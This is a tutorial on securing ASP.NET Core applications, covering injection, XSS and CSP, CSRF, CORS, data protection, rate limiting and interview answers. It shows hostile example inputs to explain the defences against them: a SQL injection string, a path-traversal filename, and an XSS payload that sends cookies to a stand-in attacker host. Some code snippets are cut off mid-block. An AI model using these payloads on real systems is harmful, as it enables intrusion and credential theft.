Securing ASP.NET Core Apps Security

What you'll master: the injection and XSS defences the framework gives you and where they stop, CSRF and why SameSite is not the whole answer, security headers and CSP that actually block something, secrets and data protection at rest, rate limiting as an availability control, and dependency risk. Prerequisites: Authentication and Authorization Policies.

Part 1 — Injection

// SQL INJECTION. EF Core parameterises LINQ automatically, so the common path
// is safe by construction — the danger is the escape hatches.

// ✓ SAFE — FromSql with an INTERPOLATED string is parameterised. The compiler
//   passes a FormattableString and EF converts each hole to a parameter:
var orders = await db.Orders
    .FromSql($"SELECT * FROM orders WHERE customer_id = {customerId}")
    .ToListAsync(ct);

// ✗ UNSAFE — FromSqlRaw with string concatenation. Same appearance, entirely
//   different behaviour:
var orders = await db.Orders
    .FromSqlRaw("SELECT * FROM orders WHERE customer_id = " + customerId)
    .ToListAsync(ct);
// customerId = "1; DROP TABLE orders--"

// ✓ FromSqlRaw is fine WITH explicit parameters:
await db.Orders.FromSqlRaw(
    "SELECT * FROM orders WHERE customer_id = {0}", customerId).ToListAsync(ct);

// THE RULE: FromSql/ExecuteSql (interpolated) are safe; the *Raw variants are
// safe ONLY with parameter arguments. Ban string concatenation near SQL in
// review — it is the one place where two nearly identical lines differ by a
// vulnerability.

// WHAT CANNOT BE PARAMETERISED: identifiers. Table names, column names and
// sort direction are not parameterisable, so dynamic sorting needs an
// ALLOWLIST — never interpolation:
private static readonly Dictionary<string, string> SortColumns = new()
{
    ["created"] = "created_at",
    ["total"]   = "total_amount"
};

if (!SortColumns.TryGetValue(sort, out var column))
    return ValidationProblem($"Cannot sort by '{sort}'.");
// `column` is now one of YOUR strings, never the caller's.

// COMMAND INJECTION — the same class of bug, worse consequences:
// ✗ Process.Start("cmd.exe", $"/c convert {userFilename} out.png");
// ✓ pass arguments as a LIST so no shell parses them:
var psi = new ProcessStartInfo("convert") { UseShellExecute = false };
psi.ArgumentList.Add(userFilename);     // never string-concatenated
psi.ArgumentList.Add("out.png");

// PATH TRAVERSAL — a filename from a user is not a path:
// ✗ File.ReadAllBytes(Path.Combine(uploadDir, userFilename));
//   userFilename = "../../appsettings.Production.json"
// ✓ strip to a bare name, then verify the resolved path stays inside:
var safeName = Path.GetFileName(userFilename);          // drops any directory
var fullPath = Path.GetFullPath(Path.Combine(uploadDir, safeName));

if (!fullPath.StartsWith(Path.GetFullPath(uploadDir), StringComparison.Ordinal))
    return Results.BadRequest("Invalid file name.");
// GetFileName alone is not sufficient on every platform and encoding — the
// resolved-prefix check is what makes it robust.

Part 2 — XSS and Content Security Policy

// RAZOR ENCODES BY DEFAULT — @model.Name is HTML-encoded, so the standard
// path is safe. The vulnerabilities are the opt-outs:
//   @Html.Raw(model.Description)                  ✗ renders markup verbatim
//   @{ var html = new HtmlString(userInput); }    ✗ same
//
// If user content must contain markup, SANITISE it — do not attempt to
// escape it yourself, because the parser is more permissive than intuition:
var sanitiser = new HtmlSanitizer();          // Ganss.Xss
sanitiser.AllowedTags.Clear();
sanitiser.AllowedTags.UnionWith(["p", "br", "strong", "em", "ul", "ol", "li", "a"]);
sanitiser.AllowedAttributes.Clear();
sanitiser.AllowedAttributes.Add("href");
sanitiser.AllowedSchemes.Clear();
sanitiser.AllowedSchemes.UnionWith(["http", "https"]);   // blocks javascript:
var safe = sanitiser.Sanitize(userHtml);

// JSON EMBEDDED IN HTML is the case people miss. A JSON string containing a
// closing script tag terminates the block regardless of JSON validity.
// ✓ Put it in a non-executable block and parse it:
//   <script type="application/json" id="data">@Json.Serialize(model)</script>
//   const data = JSON.parse(document.getElementById('data').textContent);

// FOR APIs the XSS risk transfers to the client, but this header still matters:
context.Response.Headers["X-Content-Type-Options"] = "nosniff";
// Without nosniff a browser may sniff a JSON response containing HTML and
// render it — turning a data endpoint into a reflected XSS vector.

// ── CONTENT SECURITY POLICY: the defence that works when escaping fails ──
app.Use(async (context, next) =>
{
    context.Response.Headers["Content-Security-Policy"] =
        "default-src 'self'; " +
        "script-src 'self'; " +           // NO 'unsafe-inline'
        "style-src 'self'; " +
        "img-src 'self' data:; " +
        "object-src 'none'; " +           // no plugins
        "base-uri 'self'; " +             // stops base-tag hijacking
        "frame-ancestors 'none'; " +      // modern clickjacking defence
        "form-action 'self'";
    await next();
});

// 'unsafe-inline' IN script-src DEFEATS CSP ENTIRELY for XSS purposes — an
// injected script is inline, so allowing inline scripts allows the attack the
// policy exists to stop. Teams add it to make an existing site work and then
// believe they have CSP. If inline scripts are unavoidable, use a per-request
// NONCE:
var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16));
context.Items["csp-nonce"] = nonce;
// header: script-src 'self' 'nonce-{nonce}'
// The nonce must be unpredictable and REGENERATED PER REQUEST — a static
// nonce is worth nothing.

// ROLL IT OUT SAFELY with report-only first, which blocks nothing but tells
// you what would break:
context.Response.Headers["Content-Security-Policy-Report-Only"] = policy;
Key insight: most security headers are only as good as the weakest directive in them. A CSP containing 'unsafe-inline' in script-src provides essentially no XSS protection, yet it looks like a configured policy to any audit that only checks whether the header exists. The same pattern recurs across the stack: HSTS without includeSubDomains leaves sibling subdomains attackable, SameSite=None without Secure is rejected outright by browsers, and CORS with AllowAnyOrigin plus credentials is silently ignored. Check what a header actually enforces, never whether it is present.

Part 3 — CSRF and CORS

// ── CSRF: only a problem for COOKIE authentication ───────────────────────
// The browser attaches cookies to cross-site requests automatically, so
// evil.com can submit a form to your bank and the session rides along.
// Bearer tokens are immune because nothing attaches them automatically.

builder.Services.AddAntiforgery(options =>
{
    options.HeaderName = "X-CSRF-TOKEN";       // lets SPAs send it
    options.Cookie.Name = "__Host-csrf";
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
});

// Razor forms get a hidden token automatically; [ValidateAntiForgeryToken]
// enforces it. For APIs using cookie auth, validate explicitly:
app.MapPost("/api/orders", async (
    HttpContext context, IAntiforgery antiforgery, CreateOrder request) =>
{
    await antiforgery.ValidateRequestAsync(context);   // throws if invalid
    // ...
});

// SAMESITE IS A MITIGATION, NOT THE FIX:
options.Cookie.SameSite = SameSiteMode.Lax;
//   Strict  cookie never sent cross-site. Safest; breaks inbound links from
//           other sites, since arriving users appear logged out.
//   Lax     sent on top-level GET navigations only. Good default: blocks
//           cross-site POST, which is the CSRF vector.
//   None    always sent. REQUIRES Secure, and reopens CSRF entirely.
//
// Why SameSite alone is insufficient: older browsers ignore it, subdomains
// count as same-site (so an XSS on a sibling subdomain bypasses it), and
// SameSite=None is sometimes genuinely required. Defence in depth — use both.

// ── CORS: a browser restriction, never a server access control ───────────
builder.Services.AddCors(options =>
{
    options.AddPolicy("spa", policy => policy
        .WithOrigins("https://app.example.com")     // explicit, never wildcard
        .AllowedToAllowWildcardSubdomains()
        .WithMethods("GET", "POST", "PUT", "DELETE")
        .WithHeaders("Authorization", "Content-Type")
        .AllowCredentials());                        // needed for cookies
});

app.UseCors("spa");     // AFTER UseRouting, BEFORE UseAuthentication

// ✗ AllowAnyOrigin() + AllowCredentials() is INVALID and silently ignored by
//   browsers — the spec forbids the combination, so a config that looks
//   permissive actually blocks everything.
//
// THE MISCONCEPTION WORTH KILLING: CORS does not protect your API. It
// instructs BROWSERS about which origins may read responses. curl, Postman
// and any server-side client ignore it completely. A permissive CORS policy
// is not a vulnerability by itself, and a restrictive one is not
// authorization. Authentication and authorization are the access control.

Part 4 — Headers, HTTPS, and Data Protection

// ── THE HEADER SET WORTH SETTING ─────────────────────────────────────────
app.Use(async (context, next) =>
{
    var headers = context.Response.Headers;
    headers["X-Content-Type-Options"] = "nosniff";
    headers["Referrer-Policy"] = "strict-origin-when-cross-origin";
    headers["X-Frame-Options"] = "DENY";              // legacy clickjacking
    headers["Permissions-Policy"] = "geolocation=(), camera=(), microphone=()";
    headers.Remove("Server");                          // reduce fingerprinting
    await next();
});

// X-Frame-Options is superseded by CSP frame-ancestors, but set both — some
// clients still honour only the older header.

// ── HTTPS AND HSTS ───────────────────────────────────────────────────────
app.UseHttpsRedirection();
app.UseHsts();       // production only — an HSTS header on localhost is
                     // cached by the browser and makes local http development
                     // impossible until the cache is manually cleared

builder.Services.AddHsts(options =>
{
    options.MaxAge = TimeSpan.FromDays(365);
    options.IncludeSubDomains = true;    // without this, subdomains are
    options.Preload = true;              // attackable via plain http
});
// Preload submits your domain to a browser-shipped list, so the FIRST request
// is protected too. It is effectively irreversible on a human timescale —
// removal takes months to propagate — so only enable it when every subdomain
// genuinely supports https, forever.

// ── DATA PROTECTION: keys must be shared and persistent ──────────────────
// The data protection API encrypts auth cookies, antiforgery tokens and
// anything you protect. By DEFAULT the keys live on local disk, which breaks
// in two ways people hit constantly:
//   • multiple instances → each has different keys, so a cookie issued by
//     instance A is rejected by instance B and users log out randomly
//   • container restarts → keys are lost, so EVERY user is logged out on
//     each deploy
builder.Services.AddDataProtection()
    .PersistKeysToAzureBlobStorage(blobUri, credential)
    .ProtectKeysWithAzureKeyVault(keyVaultUri, credential)
    .SetApplicationName("orders-api")      // must MATCH across instances
    .SetDefaultKeyLifetime(TimeSpan.FromDays(90));

// Protecting your own data with a purpose string:
var protector = provider.CreateProtector("EmailConfirmation.v1");
var token = protector.Protect(userId.ToString());
// The purpose string ISOLATES uses: a token minted for email confirmation
// cannot be replayed against a password-reset protector, because different
// purposes derive different keys.

// TIME-LIMITED tokens for anything a user receives out of band:
var limited = protector.ToTimeLimitedDataProtector();
var resetToken = limited.Protect(userId.ToString(), TimeSpan.FromHours(1));

// ── PASSWORDS ────────────────────────────────────────────────────────────
// Use ASP.NET Core Identity's hasher — it is PBKDF2 with a per-user salt and
// a tuned iteration count, and it handles upgrades as the count rises.
// Never SHA-256, never MD5, never a hand-rolled salt scheme.
var hasher = new PasswordHasher<User>();
user.PasswordHash = hasher.HashPassword(user, plaintext);

var result = hasher.VerifyHashedPassword(user, user.PasswordHash, attempt);
if (result == PasswordVerificationResult.SuccessRehashNeeded)
    user.PasswordHash = hasher.HashPassword(user, attempt);   // silent upgrade

// COMPARING SECRETS — always fixed-time, or the comparison leaks the value
// one byte at a time through timing:
CryptographicOperations.FixedTimeEquals(
    Encoding.UTF8.GetBytes(provided), Encoding.UTF8.GetBytes(expected));

Part 5 — Rate Limiting and Resource Exhaustion

// Rate limiting is an AVAILABILITY control: it stops one caller consuming the
// capacity everyone shares, and it blunts credential stuffing and scraping.
builder.Services.AddRateLimiter(options =>
{
    options.RejectionStatusCode = StatusCodes.Status429TooManyRequests;

    // Per-user when authenticated, per-IP otherwise. Keying only on IP puts
    // an entire NAT'd office in one bucket.
    options.GlobalLimiter = PartitionedRateLimiter.Create<HttpContext, string>(
        context => RateLimitPartition.GetTokenBucketLimiter(
            partitionKey: context.User.FindFirst(ClaimTypes.NameIdentifier)?.Value
                          ?? context.Connection.RemoteIpAddress?.ToString()
                          ?? "unknown",
            factory: _ => new TokenBucketRateLimiterOptions
            {
                TokenLimit = 100,               // burst capacity
                TokensPerPeriod = 20,
                ReplenishmentPeriod = TimeSpan.FromSeconds(1),
                QueueLimit = 0                  // reject rather than queue
            }));

    // A much tighter policy for authentication endpoints:
    options.AddFixedWindowLimiter("login", o =>
    {
        o.PermitLimit = 5;
        o.Window = TimeSpan.FromMinutes(1);
        o.QueueLimit = 0;
    });

    options.OnRejected = async (context, ct) =>
    {
        if (context.Lease.TryGetMetadata(MetadataName.RetryAfter, out var retry))
            context.HttpContext.Response.Headers.RetryAfter =
                ((int)retry.TotalSeconds).ToString();

        await context.HttpContext.Response.WriteAsJsonAsync(new ProblemDetails
        {
            Status = 429, Title = "Too many requests."
        }, ct);
    };
});

app.UseRateLimiter();        // AFTER UseAuthentication so it can key on user
app.MapPost("/login", Login).RequireRateLimiting("login");

// ALGORITHM CHOICE:
//   FIXED WINDOW    simplest; allows a 2x burst at a window boundary
//   SLIDING WINDOW  smooths the boundary problem, more state
//   TOKEN BUCKET    allows bursts up to capacity then throttles — usually the
//                   best fit for APIs, since real clients are bursty
//   CONCURRENCY     limits simultaneous requests rather than a rate; right
//                   for protecting an expensive downstream dependency
//
// IN-PROCESS LIMITERS ARE PER INSTANCE. With ten replicas a "100/minute"
// limit is really 1000/minute. For a genuine global limit, enforce it at the
// gateway or use a distributed counter in Redis.

// ── OTHER EXHAUSTION VECTORS, all caller-controlled ──────────────────────
builder.WebHost.ConfigureKestrel(o =>
{
    o.Limits.MaxRequestBodySize = 10 * 1024 * 1024;
    o.Limits.MaxRequestHeadersTotalSize = 32 * 1024;
    o.Limits.RequestHeadersTimeout = TimeSpan.FromSeconds(10);   // slowloris
    o.Limits.MinRequestBodyDataRate = new MinDataRate(240, TimeSpan.FromSeconds(5));
});

builder.Services.ConfigureHttpJsonOptions(o =>
    o.SerializerOptions.MaxDepth = 32);      // deeply nested JSON = stack risk

// And from earlier lessons: cap page sizes and collection lengths at the
// binding layer, and cap bulk-operation batch sizes. Every unbounded
// caller-supplied quantity is an availability risk.

// ZIP BOMBS AND UPLOADS: check the DECLARED size, cap the read, and validate
// content type by SNIFFING magic bytes rather than trusting the extension or
// the client-supplied Content-Type.

Part 6 — Dependencies, Secrets, and Verification

// ── DEPENDENCY RISK ──────────────────────────────────────────────────────
//   dotnet list package --vulnerable --include-transitive
//   dotnet list package --deprecated
//
// Run BOTH in CI and fail the build on known-vulnerable packages. Transitive
// is the important flag: most vulnerable packages arrive as a dependency of a
// dependency, so a direct-only scan misses them.
//
// <PropertyGroup>
//   <NuGetAudit>true</NuGetAudit>
//   <NuGetAuditMode>all</NuGetAuditMode>
//   <NuGetAuditLevel>moderate</NuGetAuditLevel>
//   <TreatWarningsAsErrors>true</TreatWarningsAsErrors>
// </PropertyGroup>
//
// Lock files make builds reproducible so a compromised upstream version
// cannot silently enter a rebuild:
//   <RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>
//   dotnet restore --locked-mode        (in CI)

// ── SECRETS ──────────────────────────────────────────────────────────────
//   development  dotnet user-secrets — keeps them out of the repository
//   production   a managed store accessed by WORKLOAD IDENTITY, never a
//                bootstrap credential in an environment variable
//
// Scan for committed secrets in CI (gitleaks, trufflehog). A secret that
// reaches git history must be treated as compromised and ROTATED — deleting
// the commit does not help, because it is in every clone and every fork.

// ── WHAT NEVER GOES IN A RESPONSE OR A LOG ───────────────────────────────
//   ✗ exception messages from unanticipated failures (connection strings,
//     file paths, internal hostnames)
//   ✗ stack traces in production
//   ✗ tokens, passwords, or full request bodies
//   ✓ a traceId that correlates to a full server-side log entry

// ── VERIFY IT, DO NOT ASSUME IT ──────────────────────────────────────────
[Fact]
public async Task Security_headers_are_present_and_strict()
{
    var response = await _factory.CreateClient().GetAsync("/");

    Assert.Equal("nosniff", response.Headers.GetValues("X-Content-Type-Options").Single());

    var csp = response.Headers.GetValues("Content-Security-Policy").Single();
    Assert.Contains("frame-ancestors 'none'", csp);
    // Assert the ABSENCE of the directive that would neuter the policy:
    Assert.DoesNotContain("unsafe-inline", csp);
}

[Fact]
public async Task Anonymous_request_to_protected_endpoint_is_rejected()
{
    var response = await _factory.CreateClient().GetAsync("/api/orders");
    Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
}

public async Task Errors_do_not_leak_internals()
{
    var prod = _factory.WithWebHostBuilder(b => b.UseEnvironment("Production"));
    var body = await (await prod.CreateClient()
        .GetAsync("/test/throw")).Content.ReadAsStringAsync();

    Assert.DoesNotContain("Server=", body);         // no connection strings

Interview Questions

Beginner: How does EF Core protect against SQL injection, and where does that protection stop?

EF Core translates LINQ into parameterised SQL. A caller's value travels to the database as a parameter, separately from the SQL text, so it is always treated as data and can never change the structure of the query. For ordinary LINQ, injection is impossible by construction.

The protection stops at the raw SQL escape hatches, where two lines that look almost identical behave completely differently:

  db.Orders.FromSql($"SELECT * FROM orders WHERE customer_id = {id}")        // safe: a parameter
  db.Orders.FromSqlRaw($"SELECT * FROM orders WHERE customer_id = {id}")     // UNSAFE: concatenation
  db.Orders.FromSqlRaw("SELECT * FROM orders WHERE customer_id = {0}", id)   // safe: explicit parameter

FromSql and ExecuteSql take a FormattableString, so the compiler hands EF the format and the values separately, and EF turns each hole into a parameter. The *Raw methods take a plain string, so an interpolated string passed to them has already been concatenated before EF sees it. That middle line is the classic bug; current EF Core versions ship the EF1002 analyzer for it, and it is worth promoting to an error.

The second limit is identifiers. Parameters carry values, not table names, column names or sort directions. Interpolating a column into FromSql does not inject — it binds a string value, so the query either fails or sorts by a constant and silently ignores the request. The only safe design is an allowlist that maps the caller's choice onto a string you wrote.

Two more places the guarantee does not reach: SQL built by hand for Dapper or ADO.NET, where the same parameterise-everything rule must be applied manually, and LIKE patterns, where parameterisation stops injection but a caller's % and _ still act as wildcards unless escaped. The interviewer wants the boundary: LINQ is safe, and any string near SQL is where to look.

Beginner: Is CORS a security control for your API?

No — and the reason is worth stating precisely, because the misunderstanding causes bugs in both directions. The browser's actual protection is the same-origin policy: script on one origin cannot read responses from another. CORS relaxes that policy. It is a set of response headers through which a server tells browsers which other origins may read its responses. It restricts nothing on its own; it only grants.

So CORS cannot protect the API. It is enforced by the browser, on the response. curl, Postman, mobile apps and other servers never consult it. And even inside a browser, a cross-origin form POST is sent and executed; CORS only decides whether the calling script may read the result. That is why CORS is no defence against CSRF — the state change has already happened.

  evil.example submits a form: POST /api/transfer
    the browser attaches the session cookie (unless SameSite blocks it)
    the server executes the transfer              ← CORS never consulted
    evil.example cannot read the response         ← all CORS would have stopped

Requests that need a preflight — a JSON body, custom headers, PUT or DELETE — are checked before being sent, which is a useful side effect, not a control to build on.

Where CORS configuration genuinely matters is credentials. A policy that reflects any origin, such as SetIsOriginAllowed(_ => true), combined with AllowCredentials lets any website call the API with the user's cookies and read the answers — a real data leak for a cookie-authenticated API. Without credentials, a permissive policy only exposes what an anonymous caller could fetch anyway.

The interviewer is checking that you put access control where it belongs: authentication and authorization on the server, with CORS as a narrow statement about which browser front ends may read responses.

Mid: Why is 'unsafe-inline' in a CSP script-src so damaging?

Because an XSS payload is inline script. CSP's value against XSS is that even after an attacker gets markup into the page, the browser refuses to run script the policy does not allow. 'unsafe-inline' adds inline <script> blocks, inline event handlers such as onerror=, and javascript: URLs to the allowed set — precisely the forms an injected payload takes.

The result is a policy that stops an attacker loading evil.js from another origin while permitting <img src=x onerror="fetch('//evil/'+document.cookie)">. It also looks configured, so any audit that only checks for the header passes — which is why it survives for years.

The fix is to make legitimate inline script identifiable, so it can be allowed while injected script is not:

  Content-Security-Policy: script-src 'self' 'nonce-4Xb9kQ2...' 'strict-dynamic'; object-src 'none'; base-uri 'self'

  <script nonce="4Xb9kQ2..."> ... </script>    runs: carries this response's nonce
  <script> ... </script>                       blocked: injected markup cannot know it

A nonce is a random value generated per response and placed both in the header and on each legitimate script tag; injected markup cannot predict it. Hashes do the same for static inline blocks, and 'strict-dynamic' lets a trusted script load its own dependencies without listing every host.

Three details interviewers probe. When a nonce or hash is present, browsers that support them ignore 'unsafe-inline', so it can remain only as a fallback for very old browsers. Inline event handlers cannot carry a nonce, so they must move into script files first. And a nonce is only unpredictable if the response is never cached — an output-cached page hands everyone the same nonce, turning it into a static, copyable token.

Mid: Why do users get logged out randomly after scaling an app to multiple instances?

Because the Data Protection keys are not shared. ASP.NET Core encrypts the authentication cookie, antiforgery tokens and anything you Protect() with a key ring. By default that ring is created on first use and stored locally — a folder in the user profile, or only in memory when no writable location exists — so every instance generates its own.

Behind a load balancer, instance A issues the cookie with its key, the next request lands on instance B, B cannot decrypt it, and the user is treated as anonymous. With three instances roughly two requests in three fail, which looks random. Antiforgery validation fails the same way, as 400s on form posts. Containers add a second symptom: the key ring lives in the container filesystem, so every deploy logs everyone out.

  builder.Services.AddDataProtection()
      .PersistKeysToAzureBlobStorage(blobUri, credential)   // or Redis, a DbContext, a shared volume
      .ProtectKeysWithAzureKeyVault(keyUri, credential)     // encrypted at rest
      .SetApplicationName("orders-api");                    // identical on every instance

The fix has three parts, and people usually get two. Persist the keys to shared storage. Protect them at rest, since anyone who can read the ring can forge cookies. And set the application name explicitly: keys are isolated per application, and the default discriminator derives from the content root path, which can differ between hosts — so instances sharing a store can still reject each other's cookies.

Two senior details. Sticky sessions hide the problem until an instance is replaced, so they are not a fix. And never "reset" by deleting keys: every cookie, token and protected payload becomes unreadable at once. Keys rotate every 90 days by default and old keys are retained so existing cookies still decrypt; a compromised key is revoked, not removed. The startup warning about keys stored in a non-persistent location deserves to be treated as an error in production.

Senior: A penetration test reports a CSP header present but XSS still exploitable. Explain and remediate.

The policy almost certainly contains 'unsafe-inline' in script-src, which permits exactly the inline execution an injected payload relies on, so the header is present and enforcing essentially nothing against XSS. Related weakeners produce the same outcome: 'unsafe-eval' allows string-to-code paths that many older libraries use, a wildcard or overly broad host source lets an attacker host script on any permitted origin, and a missing base-uri allows a base-tag injection to redirect every relative script URL to an attacker's server even under a strict script-src. My remediation would start by moving inline scripts into files and removing 'unsafe-inline', using per-request nonces where inline is genuinely unavoidable, and adding object-src 'none' and base-uri 'self' since both close bypasses that a script-focused policy misses. I would deploy in report-only mode first with a reporting endpoint, so I can see what would break before enforcing, then switch over. Critically, I would treat CSP as defence in depth rather than the fix: the underlying injection still needs closing at its source, which means finding the Html.Raw or unsanitised sink that allowed the payload, sanitising with a real HTML sanitiser rather than hand-rolled escaping, and adding nosniff. Finally I would add a test asserting the absence of unsafe-inline in the header, because this is a directive teams re-add under delivery pressure and the regression is otherwise invisible until the next assessment.

Senior: Design defence in depth for a public API handling payments.

I would layer controls so no single failure is sufficient, starting at the edge and ending at the data. At the perimeter, TLS everywhere with HSTS including subdomains, a WAF and gateway-level rate limiting keyed per client, since in-process limiters are per instance and a ten-replica deployment silently multiplies any limit by ten. For identity, OAuth with short-lived access tokens, per-service audiences so a token for one API is not accepted by another, and full validation of issuer, audience, lifetime and signature with a startup assertion that none of those is disabled — that misconfiguration is silent and is the one I would most expect to find. Authorization would use a fallback policy so endpoints are protected by default, with resource-level checks for ownership and, underneath, query-layer scoping so a background job or message handler cannot bypass what the HTTP layer enforces. On input, DTOs rather than entities to eliminate over-posting, validation at the boundary, bounded page sizes and collection lengths and body size, and allowlists for anything that reaches a query as an identifier. For payments specifically, idempotency keys are non-negotiable, because retrying a timed-out POST is the normal behaviour of every HTTP client and without them a network blip becomes a double charge; the key reservation must be atomic, and card data should never touch my servers at all — tokenise at the provider so the scope of any compromise is bounded. Secrets live in a managed store accessed by workload identity, with data protection keys persisted centrally so cookies and tokens survive scaling. For detection, structured logs with a traceId propagated across services, alerting on authorization denial spikes and on upstream authentication failures, since an expired API key breaks every payment while looking like a generic 500. Everything unanticipated returns an opaque error with only a traceId, with the detail in logs. And I would verify rather than assume: contract tests asserting the anonymous 401, the security headers including the absence of unsafe-inline, and that a forced exception leaks no stack trace — plus transitive dependency scanning failing the build, because the most likely route into a well-built application is a package nobody chose directly.

2 (easy): Add a security header middleware, and say which header each attack it stops.
Solution 
app.Use(async (context, next) =>
{
    var h = context.Response.Headers;

    h["X-Content-Type-Options"] = "nosniff";
    //   → MIME sniffing: stops a browser rendering a JSON response containing
    //     HTML as a document, which would make it a reflected XSS vector.

    h["X-Frame-Options"] = "DENY";
    //   → clickjacking (legacy header, still honoured by some clients).

    h["Referrer-Policy"] = "strict-origin-when-cross-origin";
    //   → leaking full URLs — including tokens or ids in the path — to
    //     third-party sites via the Referer header.

    h["Permissions-Policy"] = "geolocation=(), camera=(), microphone=()";
    //   → an injected iframe or script requesting device permissions.

    h["Content-Security-Policy"] =
        "default-src 'self'; script-src 'self'; object-src 'none'; " +
        "base-uri 'self'; frame-ancestors 'none'; form-action 'self'";
    //   → XSS execution (script-src), clickjacking (frame-ancestors),
    //     base-tag hijacking (base-uri), form exfiltration (form-action).

    h.Remove("Server");
    //   → version fingerprinting that helps an attacker pick exploits.

    await next();
});

// Register EARLY so the headers are on every response, including errors.
// Note the CSP deliberately omits 'unsafe-inline' — including it would make
// the script-src directive decorative.
3 (medium): An app scaled to three instances logs users out randomly. Diagnose and fix.
Solution 
// CAUSE: data protection keys default to the LOCAL filesystem. Each instance
// generated its own key ring, so an auth cookie encrypted by instance A
// cannot be decrypted by B or C. The load balancer moves the user between
// instances and roughly two requests in three fail to decrypt — which
// presents as "random" logouts.
//
// The same mechanism logs everyone out on every deploy in containers, because
// the key ring lives in the container filesystem and is discarded.

// ✓ FIX — persist keys centrally, encrypt them, and pin the application name:
builder.Services.AddDataProtection()
    .PersistKeysToAzureBlobStorage(
        new Uri("https://storage.blob.core.windows.net/keys/keyring.xml"),
        new DefaultAzureCredential())
    .ProtectKeysWithAzureKeyVault(
        new Uri("https://vault.vault.azure.net/keys/dataprotection"),
        new DefaultAzureCredential())
    .SetApplicationName("orders-api")            // ← MUST match everywhere
    .SetDefaultKeyLifetime(TimeSpan.FromDays(90));

// or PersistKeysToFileSystem on a shared volume.

// sharing a store but differing in name still cannot read each other's

4 (medium): Add rate limiting: 100 requests/minute per user generally, 5/minute on login.
Solution 
builder.Services.AddRateLimiter(options =>
{
    options.RejectionStatusCode = StatusCodes.Status429TooManyRequests;

    options.GlobalLimiter = PartitionedRateLimiter.Create<HttpContext, string>(
        context => RateLimitPartition.GetTokenBucketLimiter(
            // Per USER when authenticated; IP only as a fallback, because an
            // IP-only key puts a whole NAT'd office in one bucket.
            partitionKey: context.User.FindFirst(ClaimTypes.NameIdentifier)?.Value
                          ?? context.Connection.RemoteIpAddress?.ToString()
                          ?? "unknown",
            factory: _ => new TokenBucketRateLimiterOptions
            {
                TokenLimit = 100,                       // burst allowance
                TokensPerPeriod = 100,
                ReplenishmentPeriod = TimeSpan.FromMinutes(1),
                QueueLimit = 0                          // reject, do not queue
            }));

    options.AddFixedWindowLimiter("login", o =>
    {
        o.PermitLimit = 5;
        o.Window = TimeSpan.FromMinutes(1);
        o.QueueLimit = 0;
    });

    options.OnRejected = async (context, ct) =>
    {
        if (context.Lease.TryGetMetadata(MetadataName.RetryAfter, out var retry))
            context.HttpContext.Response.Headers.RetryAfter =
                ((int)retry.TotalSeconds).ToString();

        await context.HttpContext.Response.WriteAsJsonAsync(new ProblemDetails
        {
            Status = 429,
            Title = "Too many requests.",
            Detail = "Slow down and retry after the indicated interval."
        }, ct);
    };
});

5 (hard): Design secure file upload for user avatars.
Solution 
app.MapPost("/api/avatar", async (
    IFormFile file, IAvatarStore store, ClaimsPrincipal user, CancellationToken ct) =>
{
    // 1. SIZE — checked before reading. Kestrel's MaxRequestBodySize is the
    //    outer bound; this is the endpoint-specific one.
    if (file.Length > 2 * 1024 * 1024)
        return Results.BadRequest("Avatars must be under 2MB.");

    // 2. CONTENT TYPE BY MAGIC BYTES — never trust the extension or the
    //    client-supplied ContentType, both of which are attacker-controlled.
    await using var stream = file.OpenReadStream();
    var header = new byte[12];
    var read = await stream.ReadAsync(header, ct);
    stream.Position = 0;

    var format = DetectImageFormat(header.AsSpan(0, read));   // PNG/JPEG/WebP
    if (format is null)
        return Results.BadRequest("Only PNG, JPEG and WebP are accepted.");

    // 3. RE-ENCODE rather than store the original. This is the strongest
    //    control here: it strips EXIF (which carries GPS location), discards
    //    any appended payload, and guarantees the stored bytes are a real
    //    image produced by our own encoder — a polyglot file that is both a
    //    valid image and valid script does not survive re-encoding.
    using var image = await Image.LoadAsync(stream, ct);
    if (image.Width > 4000 || image.Height > 4000)
        return Results.BadRequest("Image dimensions are too large.");

    image.Mutate(x => x.Resize(256, 256));

    // 4. OUR OWN FILENAME — the user's name never touches the filesystem, so
    //    path traversal is structurally impossible rather than filtered.
    var userId = user.FindFirst(ClaimTypes.NameIdentifier)!.Value;
    var blobName = $"avatars/{userId}/{Guid.CreateVersion7()}.webp";

    await using var output = new MemoryStream();
    await image.SaveAsWebpAsync(output, ct);
    output.Position = 0;

    // 5. STORE OUTSIDE THE WEB ROOT — object storage, not wwwroot. A file
    //    under wwwroot is served by the static file middleware, which is how
    //    an uploaded file becomes an executable endpoint.
    await store.SaveAsync(blobName, output, "image/webp", ct);

    return Results.Ok(new { url = store.GetPublicUrl(blobName) });
})
.RequireAuthorization()
.DisableAntiforgery()          // token-authenticated API; see the CSRF section
.RequireRateLimiting("uploads");

// SERVING them safely:
//   • a separate domain or a CDN, so a stored payload cannot run in the app's
//     origin and reach its cookies
//   • Content-Type set from OUR re-encode, plus X-Content-Type-Options: nosniff
//   • Content-Disposition: attachment for any non-image download endpoint
//
// DECOMPRESSION BOMBS: the dimension check above is the guard. A 2MB PNG can
// declare 30000x30000 pixels and allocate gigabytes when decoded, so checking
// the FILE size alone is insufficient — dimensions must be bounded too.

# .github/workflows/security.yml
name: security
on: [push, pull_request]

jobs:
  dependencies:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-dotnet@v4

      - name: Vulnerable packages

🎯 Key Takeaways

  • LINQ is parameterised; the *Raw SQL variants are only safe with explicit parameters, and identifiers can never be parameterised — allowlist them.
  • Razor encodes by default, so XSS enters through Html.Raw and unsanitised sinks; sanitise with a real sanitiser rather than hand-rolled escaping.
  • 'unsafe-inline' in script-src makes a CSP decorative — use nonces if inline script is unavoidable, and add object-src and base-uri.
  • CSRF applies to cookie authentication only; SameSite is a mitigation, antiforgery tokens are the control.
  • CORS instructs browsers and protects nothing from non-browser clients — it is not access control.
  • Data protection keys must be persisted centrally with a shared application name, or multi-instance deployments log users out.
  • Use PasswordHasher<T> and FixedTimeEquals; hand-rolled hashing and == on secrets both leak.
  • Rate limit per user rather than per IP, and remember in-process limiters multiply by replica count.
  • Bound every caller-controlled quantity: body size, header size, JSON depth, page size, batch size, image dimensions.
  • Scan transitive dependencies and full git history in CI, and assert security behaviour with tests — headers, anonymous rejection, and error leakage are invisible otherwise.
  • An interpolated string passed to a *Raw method is concatenation, not parameterisation — the EF1002 analyzer flags it.
